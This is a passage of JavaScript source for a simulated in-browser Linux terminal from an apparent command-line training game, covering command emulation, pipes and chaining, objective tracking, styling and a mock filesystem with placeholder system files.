                return _err(`nano: ${file}: Permission denied`);
            }
            content = state.fs[path].content || '';
        } else {
            isNew = true;
            // Check if we can create the file
            const parentPath = path.split('/').slice(0, -1).join('/') || '/';
            const parent = state.fs[parentPath];
            if (!parent) return _err(`nano: ${file}: No such file or directory`);
            if (!_canWrite(parent)) return _err(`nano: ${file}: Permission denied`);
        }

        // Display nano interface
        const lines = content.split('\n');
        const displayLines = lines.slice(0, 10).map((line, i) => `  ${(i + 1).toString().padStart(3)} │ ${line}`);

        const header = `<span class="clh-highlight">  GNU nano 7.0                    ${file}${isNew ? ' [New File]' : ''}                                  </span>`;
        const footer = `<span class="clh-highlight">^G</span> Help    <span class="clh-highlight">^O</span> Write Out   <span class="clh-highlight">^W</span> Where Is    <span class="clh-highlight">^K</span> Cut       <span class="clh-highlight">^C</span> Location
<span class="clh-highlight">^X</span> Exit    <span class="clh-highlight">^R</span> Read File   <span class="clh-highlight">^\\</span> Replace     <span class="clh-highlight">^U</span> Paste     <span class="clh-highlight">^J</span> Justify`;

        // For now, simulate a basic view-only mode
        return `${header}

${displayLines.join('\n') || '  (empty file)'}
${lines.length > 10 ? `  ... (${lines.length - 10} more lines)` : ''}

${footer}

<span class="clh-dim">[Nano simulation - file displayed. Use 'echo "text" >> file' to append or redirection to write]</span>`;
    }

    function _cmd_diff(args) {
        if (args.length < 2) return _err('diff: missing operand');

        const file1 = _resolvePath(args[0]);
        const file2 = _resolvePath(args[1]);

        const node1 = state.fs[file1];
        const node2 = state.fs[file2];

        if (!node1) return _err(`diff: ${args[0]}: No such file or directory`);
        if (!node2) return _err(`diff: ${args[1]}: No such file or directory`);
        if (node1.type === 'dir') return _err(`diff: ${args[0]}: Is a directory`);
        if (node2.type === 'dir') return _err(`diff: ${args[1]}: Is a directory`);

        const lines1 = (node1.content || '').split('\n');
        const lines2 = (node2.content || '').split('\n');

        if (node1.content === node2.content) {
            return '';  // Files are identical
        }

        // Simple diff output
        const output = [`--- ${args[0]}`, `+++ ${args[1]}`];

        const maxLines = Math.max(lines1.length, lines2.length);
        for (let i = 0; i < maxLines; i++) {
            if (lines1[i] !== lines2[i]) {
                if (lines1[i] !== undefined && lines2[i] === undefined) {
                    output.push(`- ${lines1[i]}`);
                } else if (lines1[i] === undefined && lines2[i] !== undefined) {
                    output.push(`+ ${lines2[i]}`);
                } else if (lines1[i] !== lines2[i]) {
                    output.push(`- ${lines1[i]}`);
                    output.push(`+ ${lines2[i]}`);
                }
            }
        }

        return output.join('\n');
    }

    function _cmd_systemctl(args) {
        if (args.length === 0) return _err('systemctl: missing command');
        const action = args[0];
        const service = args[1];

        if (action === 'status') {
            return `● ${service || 'system'}.service - ${service || 'System'} Service
     Loaded: loaded (/etc/systemd/system/${service}.service; enabled)
     Active: <span class="clh-success">active (running)</span> since Jan 17 06:30:00 2026
   Main PID: 234 (${service})
      Tasks: 1
     Memory: 2.1M
        CPU: 10ms`;
        }

        if (['start', 'stop', 'restart', 'enable', 'disable'].includes(action)) {
            if (currentUser.username !== 'root' && !state.isSudoMode) {
                return _err(`systemctl: ${action} requires root privileges`);
            }
            return null;
        }

        return _err(`systemctl: unknown command '${action}'`);
    }

    function _cmd_service(args) {
        if (args.length < 2) return _err('service: missing arguments');
        return _cmd_systemctl([args[1], args[0]]);
    }

    function _cmd_seq(args) {
        const start = parseInt(args[0]) || 1;
        const end = parseInt(args[1]) || parseInt(args[0]) || 10;
        return Array.from({ length: Math.min(end - start + 1, 100) }, (_, i) => start + i).join('\n');
    }

    function _cmd_ln(args) {
        const symbolic = args.includes('-s');
        const files = args.filter(a => !a.startsWith('-'));
        if (files.length < 2) return _err('ln: missing file operand');
        return null;
    }

    // ═══════════════════════════════════════════════════════════════
    // PIPES, REDIRECTION, CHAINING
    // ═══════════════════════════════════════════════════════════════

    function _executePipeline(cmdLine) {
        const commands = cmdLine.split('|').map(c => c.trim());
        let output = '';
        for (const cmd of commands) {
            const { cmd: command, args } = _parseCommand(cmd);
            output = _executeCommand(command, args, cmd);
        }
        return output;
    }

    function _executeRedirect(cmdLine) {
        const append = cmdLine.includes('>>');
        const parts = cmdLine.split(append ? '>>' : '>');
        const cmd = parts[0].trim();
        const file = parts[1]?.trim();

        if (!file) return _err('syntax error: missing filename');

        const { cmd: command, args } = _parseCommand(cmd);
        const output = _executeCommand(command, args, cmd);
        const textOutput = output?.replace(/<[^>]*>/g, '') || '';

        const path = _resolvePath(file);
        if (state.fs[path]) {
            state.fs[path].content = append ? (state.fs[path].content || '') + textOutput : textOutput;
        } else {
            _cmd_touch([file]);
            if (state.fs[path]) state.fs[path].content = textOutput;
        }

        return `<span class="clh-dim">[Output redirected to ${file}]</span>`;
    }

    function _executeChain(cmdLine) {
        // TODO: Implement proper && || ; handling in Sprint T3
        const parts = cmdLine.split(/\s*(&&|\|\||;)\s*/);
        let output = '';
        let lastSuccess = true;

        for (let i = 0; i < parts.length; i++) {
            const part = parts[i];
            if (part === '&&') {
                if (!lastSuccess) break;
            } else if (part === '||') {
                if (lastSuccess) { i++; continue; }
            } else if (part === ';') {
                // Continue regardless
            } else {
                const result = _processCommand(part);
                if (result) output += (output ? '\n' : '') + result;
                lastSuccess = !result?.includes('error');
            }
        }

        return output;
    }

    // ═══════════════════════════════════════════════════════════════
    // OBJECTIVE TRACKING
    // ═══════════════════════════════════════════════════════════════

    function _checkObjectives(cmdLine, output) {
        let anyCompleted = false;

        for (const obj of state.objectives) {
            if (state.objectivesCompleted[obj.id]) continue;

            let completed = false;
            if (typeof obj.check === 'function') {
                // Pass all 3 params: cmd, state, output (for output validation)
                completed = obj.check(cmdLine, state, output);
            } else if (typeof obj.check === 'string') {
                completed = cmdLine.includes(obj.check);
            }

            if (completed) {
                state.objectivesCompleted[obj.id] = true;
                anyCompleted = true;
                _print(`<span class="clh-success">✓ Objective completed: ${obj.task}</span>`);
            }
        }

        if (anyCompleted) {
            _renderObjectives();
            _checkAllObjectivesComplete();
        }
    }

    function _checkAllObjectivesComplete() {
        const allComplete = state.objectives.every(obj => state.objectivesCompleted[obj.id]);

        if (allComplete && state.objectives.length > 0) {
            _print('');
            _print('<span class="clh-success">═══════════════════════════════════════════════════════════════</span>');
            _print('<span class="clh-success">  🎉 ALL OBJECTIVES COMPLETE!</span>');
            _print('<span class="clh-success">═══════════════════════════════════════════════════════════════</span>');
            _print('');

            // Save progress
            if (typeof ModuleProgress !== 'undefined') {
                ModuleProgress.complete('script', config.moduleId.toLowerCase());
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // UTILITIES
    // ═══════════════════════════════════════════════════════════════

    function _resolvePath(path) {
        if (!path) return state.currentDir;
        if (path === '~') return currentUser.home;
        if (path.startsWith('~/')) path = currentUser.home + path.slice(1);

        let resolved = path.startsWith('/') ? path : (state.currentDir === '/' ? '/' + path : state.currentDir + '/' + path);

        const parts = resolved.split('/').filter(p => p && p !== '.');
        const normalized = [];
        for (const part of parts) {
            if (part === '..') normalized.pop();
            else normalized.push(part);
        }
        return '/' + normalized.join('/');
    }

    function _getPrompt() {
        const dir = state.currentDir === currentUser.home ? '~' : state.currentDir.replace(currentUser.home, '~');
        const symbol = currentUser.username === 'root' ? '#' : '$';
        return `<span class="clh-user">${currentUser.username}@${config.hostname}</span>:<span class="clh-dir">${dir}</span>${symbol} `;
    }

    function _updatePrompt() {
        if (elements.promptSpan) {
            elements.promptSpan.innerHTML = _getPrompt();
        }
    }

    function _print(html) {
        if (!elements.output) return;
        const line = document.createElement('div');
        line.className = 'clh-line';
        line.innerHTML = html;
        elements.output.appendChild(line);
        elements.output.scrollTop = elements.output.scrollHeight;
    }

    function _err(msg) {
        return `<span class="clh-error">${msg}</span>`;
    }

    function _escape(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function _clear() {
        if (elements.output) elements.output.innerHTML = '';
    }

    function _historyUp() {
        if (state.historyIndex > 0) {
            state.historyIndex--;
            elements.input.value = state.commandHistory[state.historyIndex];
        }
    }

    function _historyDown() {
        if (state.historyIndex < state.commandHistory.length - 1) {
            state.historyIndex++;
            elements.input.value = state.commandHistory[state.historyIndex];
        } else {
            state.historyIndex = state.commandHistory.length;
            elements.input.value = '';
        }
    }

    function _tabComplete() {
        const input = elements.input.value;
        const parts = input.split(' ');
        const current = parts[parts.length - 1];
        if (!current) return;

        const isCmd = parts.length === 1;
        let matches = [];

        if (isCmd) {
            const cmds = ['ls', 'cd', 'pwd', 'cat', 'head', 'tail', 'grep', 'find', 'mkdir', 'rm', 'cp', 'mv', 'touch', 'chmod', 'chown', 'echo', 'whoami', 'id', 'ps', 'top', 'df', 'du', 'free', 'uname', 'man', 'help', 'clear', 'history', 'export', 'env', 'ping', 'ssh', 'curl', 'sudo', 'tree', 'nano', 'tar'];
            matches = cmds.filter(c => c.startsWith(current));
        } else {
            const basePath = current.includes('/') ? _resolvePath(current.substring(0, current.lastIndexOf('/'))) : state.currentDir;
            const prefix = current.includes('/') ? current.substring(current.lastIndexOf('/') + 1) : current;
            const node = state.fs[basePath];
            if (node && node.children) {
                matches = node.children.filter(c => c.startsWith(prefix));
            }
        }

        if (matches.length === 1) {
            parts[parts.length - 1] = isCmd ? matches[0] : (current.includes('/') ? current.substring(0, current.lastIndexOf('/') + 1) + matches[0] : matches[0]);
            elements.input.value = parts.join(' ');
        } else if (matches.length > 1) {
            _print(matches.join('  '));
        }
    }

    function _interrupt() {
        _print('<span class="clh-error">^C</span>');
        elements.input.value = '';
    }

    function _getHelp(cmd) {
        return `Usage: ${cmd} [OPTIONS] [ARGUMENTS]\nTry '${cmd} --help' or 'man ${cmd}' for more information.`;
    }

    // ═══════════════════════════════════════════════════════════════
    // STYLES
    // ═══════════════════════════════════════════════════════════════

    function _injectStyles() {
        if (document.getElementById('clh-terminal-styles')) return;

        const styles = document.createElement('style');
        styles.id = 'clh-terminal-styles';
        styles.textContent = `
            .clh-terminal {
                font-family: 'Fira Code', 'Monaco', 'Consolas', monospace;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                color: #00ff00;
                height: 100vh;
                display: flex;
                flex-direction: column;
                overflow: hidden;
            }

            .clh-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 10px 20px;
                background: rgba(0, 255, 0, 0.1);
                border-bottom: 1px solid #00ff00;
            }

            .clh-header-left { display: flex; align-items: center; gap: 15px; }
            .clh-badge {
                background: #00ff00;
                color: #000;
                padding: 4px 12px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 14px;
            }
            .clh-title { font-size: 18px; font-weight: 500; }
            .clh-back { color: #00ff00; text-decoration: none; opacity: 0.7; }
            .clh-back:hover { opacity: 1; }

            .clh-body {
                display: flex;
                flex: 1;
                overflow: hidden;
            }

            .clh-terminal-area {
                flex: 1;
                display: flex;
                flex-direction: column;
                border-right: 1px solid #333;
            }

            .clh-terminal-header {
                display: flex;
                align-items: center;
                gap: 8px;
                padding: 8px 15px;
                background: #1a1a1a;
                border-bottom: 1px solid #333;
            }

            .clh-dot {
                width: 12px;
                height: 12px;
                border-radius: 50%;
            }
            .clh-dot.red { background: #ff5f56; }
            .clh-dot.yellow { background: #ffbd2e; }
            .clh-dot.green { background: #27ca40; }
            .clh-terminal-title { margin-left: 10px; opacity: 0.7; font-size: 13px; }

            .clh-output {
                flex: 1;
                overflow-y: auto;
                padding: 15px;
                font-size: 14px;
                line-height: 1.5;
            }

            .clh-line { white-space: pre-wrap; word-wrap: break-word; }

            .clh-input-line {
                display: flex;
                align-items: center;
                padding: 10px 15px;
                background: rgba(0, 0, 0, 0.3);
                border-top: 1px solid #333;
            }

            .clh-prompt { white-space: nowrap; }
            .clh-input {
                flex: 1;
                background: transparent;
                border: none;
                color: #00ff00;
                font-family: inherit;
                font-size: 14px;
                outline: none;
                caret-color: #00ff00;
            }

            .clh-objectives-panel {
                width: 300px;
                padding: 20px;
                background: rgba(0, 0, 0, 0.3);
                overflow-y: auto;
            }

            .clh-objectives-panel h3 {
                margin: 0 0 15px 0;
                font-size: 16px;
                color: #00ff00;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
            }

            .clh-objective {
                display: flex;
                align-items: flex-start;
                gap: 10px;
                padding: 10px;
                margin-bottom: 10px;
                background: rgba(0, 255, 0, 0.05);
                border-radius: 4px;
                border: 1px solid transparent;
            }

            .clh-objective.completed {
                border-color: #00ff00;
                background: rgba(0, 255, 0, 0.1);
            }

            .clh-objective-num {
                width: 24px;
                height: 24px;
                display: flex;
                align-items: center;
                justify-content: center;
                background: rgba(0, 255, 0, 0.2);
                border-radius: 50%;
                font-size: 12px;
                flex-shrink: 0;
            }

            .clh-objective.completed .clh-objective-num {
                background: #00ff00;
                color: #000;
            }

            .clh-objective-task { font-size: 13px; }
            .clh-objective-hint { font-size: 11px; opacity: 0.6; margin-top: 4px; font-family: monospace; }

            /* Color classes */
            .clh-cmd { color: #00ff00; }
            .clh-dir { color: #5c9eff; }
            .clh-symlink { color: #00ffff; }
            .clh-exec { color: #ff5c5c; }
            .clh-error { color: #ff5c5c; }
            .clh-success { color: #27ca40; }
            .clh-highlight { color: #ffd700; }
            .clh-dim { opacity: 0.6; }
            .clh-user { color: #00ff00; }
            .clh-welcome { color: #5c9eff; }

            /* Locked/Error states */
            .clh-locked, .clh-error-page {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                color: #00ff00;
                text-align: center;
                padding: 20px;
            }

            .clh-locked-icon, .clh-error-icon { font-size: 64px; margin-bottom: 20px; }
            .clh-locked h2, .clh-error h2 { margin: 0 0 10px 0; }
            .clh-locked ul { list-style: none; padding: 0; }
            .clh-locked li { padding: 5px 0; }
            .clh-locked-back, .clh-error-back {
                margin-top: 20px;
                color: #00ff00;
                text-decoration: none;
                padding: 10px 20px;
                border: 1px solid #00ff00;
                border-radius: 4px;
            }
            .clh-locked-back:hover, .clh-error-back:hover {
                background: rgba(0, 255, 0, 0.1);
            }

            /* Scrollbar */
            .clh-output::-webkit-scrollbar { width: 8px; }
            .clh-output::-webkit-scrollbar-track { background: transparent; }
            .clh-output::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
            .clh-output::-webkit-scrollbar-thumb:hover { background: #555; }
        `;

        document.head.appendChild(styles);
    }

    // ═══════════════════════════════════════════════════════════════
    // PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    return {
        init: init,
        execute: _execute,
        print: _print,
        clear: _clear,
        getState: () => ({ ...state }),
        getConfig: () => ({ ...config }),
        getCwd: () => state.currentDir,
    };

})();

/**
 * CLHTerminal Class Wrapper
 * Provides class-based API for HTML files that use: new CLHTerminal({options})
 */
class CLHTerminal {
    constructor(options = {}) {
        this.options = options;
        this.moduleId = options.moduleId;
        this.initialized = false;

        // Store callbacks
        this._onObjectiveComplete = options.onObjectiveComplete || (() => {});
        this._onModuleComplete = options.onModuleComplete || (() => {});
        this._onCommand = options.onCommand || (() => {});

        // Initialize
        this._init();
    }

    _init() {
        const moduleConfig = typeof CLHConfig !== 'undefined' ? CLHConfig.getModule(this.moduleId) : null;

        if (!moduleConfig) {
            console.error(`[CLHTerminal] Module not found: ${this.moduleId}`);
            return;
        }

        this.config = moduleConfig;
        this.user = moduleConfig.user || 'operator';
        this.hostname = moduleConfig.hostname || 'hexworth';
        this.startDir = moduleConfig.startDir || `/home/${this.user}`;
        this.currentDir = this.startDir;

        // Build filesystem
        this.fs = this._buildFilesystem(moduleConfig.filesystem || {});

        // Track objectives
        this.objectives = moduleConfig.objectives || [];
        this.objectivesCompleted = {};
        this.completedCount = 0;

        // Command history
        this.commandHistory = [];
        this.historyIndex = -1;

        // Environment variables
        this.env = {
            USER: this.user,
            HOME: `/home/${this.user}`,
            PWD: this.currentDir,
            SHELL: '/bin/bash',
            PATH: '/usr/local/bin:/usr/bin:/bin',
            HOSTNAME: this.hostname,
        };

        // Radio system state (The Watcher)
        this.radio = {
            frequency: 147.3,
            channels: {
                147.3: { name: 'STATIC', type: 'noise' },
                152.8: { name: 'SECURITY', type: 'ambient' },
                156.1: { name: 'CONSORTIUM', type: 'lore' },
                161.7: { name: 'GHOST-7', type: 'hints' },
                173.5: { name: 'NUMBERS', type: 'easter' },
                88.1:  { name: 'EMERGENCY', type: 'solutions' }
            },
            aliases: {
                'static': 147.3,
                'security': 152.8,
                'consortium': 156.1,
                'ghost': 161.7,
                'ghost-7': 161.7,
                'numbers': 173.5,
                'emergency': 88.1
            }
        };

        // Vim state
        this._vimMode = null; // null = not in vim, 'normal', 'insert', 'command'
        this._vimFile = null;
        this._vimContent = [];
        this._vimCursorLine = 0;
        this._vimCursorCol = 0;
        this._vimCommandBuffer = '';
        this._vimMessage = '';
        this._vimModified = false;

        // Job control state
        this._jobs = []; // Array of {id, command, status: 'running'|'stopped', pid}
        this._nextJobId = 1;
        this._nextPid = 1000;
        this._currentForegroundJob = null;

        // Achievement tracking
        this._achievements = this._loadAchievements();
        this._achievementStats = {
            commandCount: 0,
            tabCount: 0,
            pipeCount: 0,
            wildcardCount: 0,
            redirectCount: 0,
            ctrlRUsed: false,
            vimExitedClean: false,
            easterEggsFound: new Set(),
            startTime: Date.now()
        };

        // Get DOM elements
        const containerSelector = this.options.container || '#terminal';
        const inputSelector = this.options.inputElement || '#commandInput';

        this.outputEl = document.querySelector(containerSelector);
        this.inputEl = document.querySelector(inputSelector);

        if (!this.outputEl || !this.inputEl) {
            console.error('[CLHTerminal] Container or input element not found');
            return;
        }

        // Setup event listeners
        this._setupEventListeners();
        this.initialized = true;
    }

    _buildFilesystem(moduleFs) {
        // Base filesystem structure
        const baseFs = {
            '/': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['home', 'etc', 'var', 'tmp', 'usr', 'bin', 'root'] },
            '/home': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [this.user] },
            [`/home/${this.user}`]: { type: 'dir', perms: 'drwxr-xr-x', owner: this.user, group: this.user, children: [] },
            '/etc': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['passwd', 'group', 'hosts', 'resolv.conf', 'shadow', 'sudoers', 'crontab', 'ssh'] },
            '/etc/passwd': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: `root:x:0:0:root:/root:/bin/bash\n${this.user}:x:1000:1000:${this.user}:/home/${this.user}:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin` },
            '/etc/group': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: `root:x:0:\n${this.user}:x:1000:\nsudo:x:27:${this.user}` },
            '/etc/hosts': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: '127.0.0.1\tlocalhost\n127.0.1.1\t' + this.hostname },
            '/etc/resolv.conf': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: 'nameserver 8.8.8.8\nnameserver 8.8.4.4' },
            '/etc/shadow': { type: 'file', perms: '-rw-------', owner: 'root', group: 'shadow', content: `root:*:19000:0:99999:7:::\n${this.user}:$6$rounds=4096$salt$hash:19000:0:99999:7:::` },
            '/etc/sudoers': { type: 'file', perms: '-r--r-----', owner: 'root', group: 'root', content: `root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n${this.user} ALL=(ALL) NOPASSWD: ALL` },
            '/etc/crontab': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: 'SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly' },
            '/etc/ssh': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['sshd_config'] },
            '/etc/ssh/sshd_config': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', content: 'Port 22\nPermitRootLogin no\nPasswordAuthentication yes' },
            '/var': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['log', 'tmp'] },
            '/var/log': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['syslog', 'auth.log', 'messages'] },
            '/var/log/syslog': { type: 'file', perms: '-rw-r-----', owner: 'syslog', group: 'adm', content: 'Jan 18 10:00:00 ' + this.hostname + ' systemd[1]: Started Session 1 of user ' + this.user },
            '/var/log/auth.log': { type: 'file', perms: '-rw-r-----', owner: 'syslog', group: 'adm', content: 'Jan 18 09:55:00 ' + this.hostname + ' sshd[1234]: Accepted password for ' + this.user + ' from 192.168.1.100 port 52413 ssh2' },
            '/var/log/messages': { type: 'file', perms: '-rw-r-----', owner: 'syslog', group: 'adm', content: 'System boot completed' },
            '/var/tmp': { type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root', children: [] },
            '/tmp': { type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root', children: [] },
            '/usr': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bin', 'local'] },
            '/usr/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
            '/usr/local': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bin'] },
            '/usr/local/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
            '/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bash', 'ls', 'cat', 'grep'] },
            '/root': { type: 'dir', perms: 'drwx------', owner: 'root', group: 'root', children: [] },
        };

        // Merge module-specific filesystem
        return { ...baseFs, ...moduleFs };
    }

    _setupEventListeners() {
        // Track for double-tab detection
        this._lastTabTime = 0;
        this._lastTabWord = '';
        // Track for reverse search mode
        this._reverseSearchMode = false;
        this._reverseSearchQuery = '';
        this._savedInputValue = '';

        this.inputEl.addEventListener('keydown', (e) => {
            // Handle vim mode separately
            if (this._vimMode) {
                this._handleVimKey(e);
                return;
            }

            // Handle reverse search mode separately
            if (this._reverseSearchMode) {
                this._handleReverseSearchKey(e);
                return;
            }

            // Ctrl key combinations (bash shortcuts)
            if (e.ctrlKey) {
                switch (e.key.toLowerCase()) {
                    case 'c': // Ctrl+C - Cancel/SIGINT
                        e.preventDefault();
                        this._printCommand(this.inputEl.value + '^C');
                        this.inputEl.value = '';
                        return;
                    case 'l': // Ctrl+L - Clear screen
                        e.preventDefault();
                        this.outputEl.innerHTML = '';
                        return;
                    case 'a': // Ctrl+A - Beginning of line
                        e.preventDefault();
                        this.inputEl.selectionStart = this.inputEl.selectionEnd = 0;
                        return;
                    case 'e': // Ctrl+E - End of line
                        e.preventDefault();
                        this.inputEl.selectionStart = this.inputEl.selectionEnd = this.inputEl.value.length;
                        return;
                    case 'u': // Ctrl+U - Delete to beginning
                        e.preventDefault();
                        const posU = this.inputEl.selectionStart;
                        this.inputEl.value = this.inputEl.value.substring(posU);
                        this.inputEl.selectionStart = this.inputEl.selectionEnd = 0;
                        return;
                    case 'k': // Ctrl+K - Delete to end
                        e.preventDefault();
                        const posK = this.inputEl.selectionStart;
                        this.inputEl.value = this.inputEl.value.substring(0, posK);
                        return;
                    case 'w': // Ctrl+W - Delete word before cursor
                        e.preventDefault();
                        this._deleteWordBeforeCursor();
                        return;
                    case 'd': // Ctrl+D - EOF / logout
                        e.preventDefault();
                        if (this.inputEl.value === '') {
                            this._printOutput('logout');
                        }
                        return;
                    case 'r': // Ctrl+R - Reverse search
                        e.preventDefault();
                        this._startReverseSearch();
                        return;
                    case 'z': // Ctrl+Z - Suspend foreground job
                        e.preventDefault();
                        this._handleCtrlZ();
                        return;
                }
            }

            // Regular key handling
            if (e.key === 'Enter') {
                e.preventDefault();
                const cmd = this.inputEl.value.trim();
                this.inputEl.value = '';
                if (cmd) {
                    this._executeWithChaining(cmd);
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                this._handleTabCompletion();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                this._historyUp();
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                this._historyDown();
            } else if (e.key === 'Escape') {
                // Clear line like bash
                this.inputEl.value = '';
            }
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // BASH KEYBOARD SHORTCUTS
    // ═══════════════════════════════════════════════════════════════

    _deleteWordBeforeCursor() {
        const pos = this.inputEl.selectionStart;
        const before = this.inputEl.value.substring(0, pos);
        const after = this.inputEl.value.substring(pos);

        // Find word boundary (skip trailing spaces, then find previous space)
        let i = before.length - 1;
        while (i >= 0 && before[i] === ' ') i--;
        while (i >= 0 && before[i] !== ' ') i--;

        const newBefore = before.substring(0, i + 1);
        this.inputEl.value = newBefore + after;
        this.inputEl.selectionStart = this.inputEl.selectionEnd = newBefore.length;
    }

    _handleCtrlZ() {
        // Simulate suspending the current foreground process
        if (this._currentForegroundJob) {
            // Suspend the running job
            const job = this._currentForegroundJob;
            job.status = 'stopped';
            this._printOutput(`^Z`);
            this._printOutput(`[${job.id}]+  Stopped                 ${job.command}`);
            this._currentForegroundJob = null;
        } else if (this.inputEl.value.trim()) {
            // If there's text in the input, simulate stopping a "command"
            const cmd = this.inputEl.value.trim();
            const job = {
                id: this._nextJobId++,
                pid: this._nextPid++,
                command: cmd,
                status: 'stopped'
            };
            this._jobs.push(job);
            this._printCommand(cmd + '^Z');
            this._printOutput(`[${job.id}]+  Stopped                 ${cmd}`);
            this.inputEl.value = '';
        } else {
            // Nothing to suspend
            this._printCommand('^Z');
        }
    }

    _startReverseSearch() {
        this._reverseSearchMode = true;
        this._reverseSearchQuery = '';
        this._savedInputValue = this.inputEl.value;
        this._updateReverseSearchDisplay();
    }

    _handleReverseSearchKey(e) {
        if (e.key === 'Escape' || (e.ctrlKey && e.key.toLowerCase() === 'c')) {
            // Cancel search
            e.preventDefault();
            this._reverseSearchMode = false;
            this.inputEl.value = this._savedInputValue;
            this.inputEl.placeholder = '';
            return;
        }

        if (e.key === 'Enter') {
            // Accept search result
            e.preventDefault();
            this._reverseSearchMode = false;
            this.inputEl.placeholder = '';
            // Track Ctrl+R achievement if a match was found
            if (this.inputEl.value !== this._savedInputValue && this.inputEl.value.trim()) {
                this._trackCtrlR();
            }
            return;
        }

        if (e.ctrlKey && e.key.toLowerCase() === 'r') {
            // Find next match
            e.preventDefault();
            this._findNextReverseMatch();
            return;
        }

        if (e.key === 'Backspace') {
            e.preventDefault();
            this._reverseSearchQuery = this._reverseSearchQuery.slice(0, -1);
            this._updateReverseSearchDisplay();
            return;
        }

        if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
            e.preventDefault();
            this._reverseSearchQuery += e.key;
            this._updateReverseSearchDisplay();
        }
    }

    _updateReverseSearchDisplay() {
        this.inputEl.placeholder = `(reverse-i-search)\`${this._reverseSearchQuery}': `;

        if (this._reverseSearchQuery) {
            // Find matching history entry
            for (let i = this.commandHistory.length - 1; i >= 0; i--) {
                if (this.commandHistory[i].includes(this._reverseSearchQuery)) {
                    this.inputEl.value = this.commandHistory[i];
                    this.historyIndex = i;
                    return;
                }
            }
            this.inputEl.value = '';
        } else {
            this.inputEl.value = '';
        }
    }

    _findNextReverseMatch() {
        const startIdx = this.historyIndex > 0 ? this.historyIndex - 1 : this.commandHistory.length - 1;
        for (let i = startIdx; i >= 0; i--) {
            if (this.commandHistory[i].includes(this._reverseSearchQuery)) {
                this.inputEl.value = this.commandHistory[i];
                this.historyIndex = i;
                return;
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // COMMAND CHAINING (&&, ||, ;, |)
    // ═══════════════════════════════════════════════════════════════

    _executeWithChaining(cmdLine) {
        // Check for watcher trigger keywords (help/stuck/sos)
        const watcherResponse = this._checkWatcherKeywords(cmdLine);
        if (watcherResponse) {
            this._printCommand(cmdLine);
            this._printOutput(watcherResponse);
            this.commandHistory.push(cmdLine);
            this.historyIndex = this.commandHistory.length;
            return;
        }

        // Parse command chains: &&, ||, ;, |
        const chains = this._parseCommandChain(cmdLine);
        let lastExitCode = 0;
        let lastOutput = '';

        // Print the FULL command line once and add to history
        this._printCommand(cmdLine);
        this.commandHistory.push(cmdLine);
        this.historyIndex = this.commandHistory.length;

        for (const chain of chains) {
            const { cmd, operator } = chain;

            // Check if we should execute based on previous exit code
            if (operator === '&&' && lastExitCode !== 0) continue;
            if (operator === '||' && lastExitCode === 0) continue;

            // Handle pipe - pass previous output as input context
            const pipeInput = operator === '|' ? lastOutput : null;

            // fromChain=true tells _executeSingleCommand not to print or add to history
            const result = this._executeSingleCommand(cmd.trim(), pipeInput, true);
            lastExitCode = result.exitCode;
            lastOutput = result.output;
        }

        // Print the FINAL output only (not intermediate pipe results)
        if (lastOutput) {
            this._printOutput(lastOutput);
        }

        // Check objectives with the full command line and final output
        this._checkObjectives(cmdLine, lastOutput);

        // Track achievements
        this._trackAchievements(cmdLine);

        // Show smart hints
        const hint = this._getSmartHint(cmdLine, lastOutput);
        if (hint) {
            this._showSmartHint(hint);
        }

        // Callback
        this._onCommand(cmdLine, lastOutput);
    }

    _parseCommandChain(cmdLine) {
        const chains = [];
        let current = '';
        let i = 0;
        let inQuote = null;

        while (i < cmdLine.length) {
            const char = cmdLine[i];
            const next = cmdLine[i + 1];

            // Handle quotes
            if ((char === '"' || char === "'") && !inQuote) {
                inQuote = char;
                current += char;
                i++;
                continue;
            }
            if (char === inQuote) {
                inQuote = null;
                current += char;
                i++;
                continue;
            }

            // Skip operators inside quotes
            if (inQuote) {
                current += char;
                i++;
                continue;
            }

            // Check for operators
            if (char === '&' && next === '&') {
                if (current.trim()) chains.push({ cmd: current, operator: chains.length ? chains[chains.length-1].nextOp : null });
